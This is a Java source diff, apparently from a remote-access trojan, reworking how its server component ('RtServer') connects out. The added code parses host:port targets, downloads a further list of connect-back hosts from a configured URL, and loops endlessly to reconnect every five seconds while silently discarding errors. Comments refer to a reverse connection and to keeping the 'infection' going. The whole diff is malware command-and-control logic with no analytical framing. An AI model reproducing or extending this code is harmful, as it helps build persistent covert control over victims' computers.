@@ -7,8 +7,13 @@ import java.net.NetworkInterface;
 import java.net.SocketException;
 import java.util.ArrayList;
 import java.util.Enumeration;
+import java.util.HashMap;
+import java.util.List;
+import java.util.Map;
+import network.Conexion;
 import rt.util.CLRT;
 import rt.util.IMG;
+import rt.util.UtilRT;
 
 public class RtServer implements Interfaz {
 
@@ -18,8 +23,6 @@ public class RtServer implements Interfaz {
         boolean instaladoServicio = (Boolean) parametros[1];
         CLRT cl = new CLRT();
         Inicio.con = new ArrayList<Interfaz>();
-        //String rtdns = B64.decodeString(ID);
-//        String rtdns = ID;
         try {
             if ((Boolean) Inicio.config.obtenerParametro("instalar")) {
                 try {
@@ -78,53 +81,99 @@ public class RtServer implements Interfaz {
         IMG.iniciar();
 
         try {
-            //if (gui) {
             if ((Boolean) Inicio.config.obtenerParametro("gui")) {
                 try {
+                    String host, puerto, dnsUnico;
+                    dnsUnico = (String) Inicio.config.obtenerParametro("dns");
+                    if (dnsUnico.contains(":")) {
+                        host = dnsUnico.split(":")[0];
+                        puerto = dnsUnico.split(":")[1];
+                    } else {
+                        host = dnsUnico;
+                        puerto = "4000";
+                    }
+
                     Interfaz ventana = ((Interfaz) cl.loadClass("rt.gui.Ventana").newInstance());
                     ventana.instanciar(
-                            Inicio.config.obtenerParametro("dns"),
-                            Inicio.config.obtenerParametro("puerto"),
-                            Inicio.config.obtenerParametro("puerto"),
+                            host,
+                            Integer.parseInt(puerto),
+                            Integer.parseInt(puerto),
                             Inicio.config.obtenerParametro("password"),
                             Inicio.config.obtenerParametro("delay"),
                             Inicio.config.obtenerParametro("prefijo"),
-                            Inicio.config.obtenerParametro("off-escritorio"),
-                            Inicio.config.obtenerParametro("off-escritorio-delay"),
                             Inicio.config.obtenerParametro("tipoConexion"));
                 } catch (Exception e) {
                 }
-                //quito el return para que igual continue con la infeccion en caso de usar gui
-                //return;
-
             } else {
 
-                Inicio.config.agregarParametro("dns", (procesarRangosIps((String) Inicio.config.obtenerParametro("dns"))));
-                String[] dnsUnicos = ((String) Inicio.config.obtenerParametro("dns")).split(";");
-                for (String dnsUnico : dnsUnicos) {
-                    dnsUnico = dnsUnico.trim();
+                Map<String, Boolean> mapa = new HashMap<String, Boolean>();
+
+                while (true) {
+                    Inicio.config.agregarParametro("dns", (procesarRangosIps((String) Inicio.config.obtenerParametro("dns"))));
+                    List<String> listaDestinos = new ArrayList<String>();
                     try {
-                        if (dnsUnico != null && !dnsUnico.isEmpty()) {
-                            Interfaz conexion = ((Interfaz) cl.loadClass("rt.Servicio").newInstance());
-                            conexion.instanciar(
-                                    dnsUnico,
-                                    Inicio.config.obtenerParametro("puerto"),
-                                    Inicio.config.obtenerParametro("password"),
-                                    Inicio.config.obtenerParametro("delay"),
-                                    Inicio.config.obtenerParametro("prefijo"),
-                                    Inicio.config.obtenerParametro("off-escritorio"),
-                                    Inicio.config.obtenerParametro("off-escritorio-delay"),
-                                    Inicio.config.obtenerParametro("tipoConexion"));
-                            conexion.ejecutar(0);
-                            Inicio.con.add(conexion);
+                        String[] paramDns = ((String) Inicio.config.obtenerParametro("dns")).split(";");
+                        for (String str : paramDns) {
+                            listaDestinos.add(str);
                         }
                     } catch (Exception e) {
-//                        //
+
                     }
+                    try {
+                        String[] contenidoUrl = UtilRT.getArchivoTextoUrl(((String) Inicio.config.obtenerParametro("urlDns"))).split("\n");
+                        for (String str : contenidoUrl) {
+                            listaDestinos.add(str);
+                        }
+                    } catch (Exception e) {
+
+                    }
+
+                    String host = null, puerto = null;
+                    for (String dnsUnico : listaDestinos) {
+                        try {
+                            if (dnsUnico != null && !dnsUnico.isEmpty()) {
+                                dnsUnico = dnsUnico.trim();
+                                if (dnsUnico.contains(":")) {
+                                    host = dnsUnico.split(":")[0];
+                                    puerto = dnsUnico.split(":")[1];
+                                } else {
+                                    host = dnsUnico;
+                                    puerto = "4000";
+                                }
+                                if (!mapa.containsKey(host + puerto) && probarConexion(host, Integer.valueOf(puerto))) {
+                                    mapa.put(host + puerto, true);
+                                    Interfaz conexion = ((Interfaz) cl.loadClass("rt.Servicio").newInstance());
+                                    conexion.instanciar(
+                                            host,
+                                            Integer.valueOf(puerto),
+                                            Inicio.config.obtenerParametro("password"),
+                                            Inicio.config.obtenerParametro("delay"),
+                                            Inicio.config.obtenerParametro("prefijo"),
+                                            Inicio.config.obtenerParametro("tipoConexion"));
+                                    conexion.ejecutar(0);
+                                    Inicio.con.add(conexion);
+                                }
+                            }
+                        } catch (Exception e) {
+
+                        }
+                    }
+
+                    //las que ya existen los mantiene ejecutando, 
+                    try {
+                        for (Interfaz serv : Inicio.con) {
+                            if (!(Boolean) serv.get(1)) {
+                                serv.ejecutar(0);
+                            }
+                        }
+                        Thread.sleep(5000);
+                    } catch (Exception e) {
+                    }
+
                 }
             }
         } catch (Exception e) {
-//            //
+
         }
 //----------------------------------- PARA PRUEBAS LOCALES -------------------------------
 //        try {
@@ -136,8 +185,8 @@ public class RtServer implements Interfaz {
 //                dnsUnico = dnsUnico.trim();
 //                if (!((String) Inicio.config.obtenerParametro("dns")).contains(dnsUnico)) {
 //                    Interfaz conexion = ((Interfaz) cl.loadClass("rt.Servicio").newInstance());
-//                    conexion.instanciar(dnsUnico, 4000, null, 3000, "test_", false, 3000, 1); //conexion inversa
-////                    conexion.instanciar(dnsUnico, 4100,  null, 3000, "rt2_", false, 3000, 2); //conexion directa
+//                    conexion.instanciar(dnsUnico, 4000, null, 3000, "test_",  1); //conexion inversa
+////                    conexion.instanciar(dnsUnico, 4100,  null, 3000, "rt2_",  2); //conexion directa
 //                    conexion.ejecutar(0);
 //                    Inicio.con.add(conexion);
 //                }
@@ -145,18 +194,8 @@ public class RtServer implements Interfaz {
 //        } catch (Exception e) {
 //        }
 //-------------------------------------------------------------        
-        cl = null;
-        while (true) {
-            try {
-                for (Interfaz serv : Inicio.con) {
-                    if (!(Boolean) serv.get(1)) {
-                        serv.ejecutar(0);
-                    }
-                }
-                Thread.sleep(5000);
-            } catch (Exception e) {
-            }
-        }
+//        cl = null;
+
     }
 
     private String procesarRangosIps(String ipRango) {
@@ -230,5 +269,14 @@ public class RtServer implements Interfaz {
 
     public void ejecutar(int opcion, Object... parametros) {
 
+    }
+
+    private boolean probarConexion(String host, Integer puerto) {
+        try {
+            Conexion conexion = new Conexion(host, puerto, (Integer) Inicio.config.obtenerParametro("protocolo"), (Boolean) Inicio.config.obtenerParametro("ssl"));
+            return conexion.isConectado();
+        } catch (Exception e) {
+            return false;
+        }
     }
 }
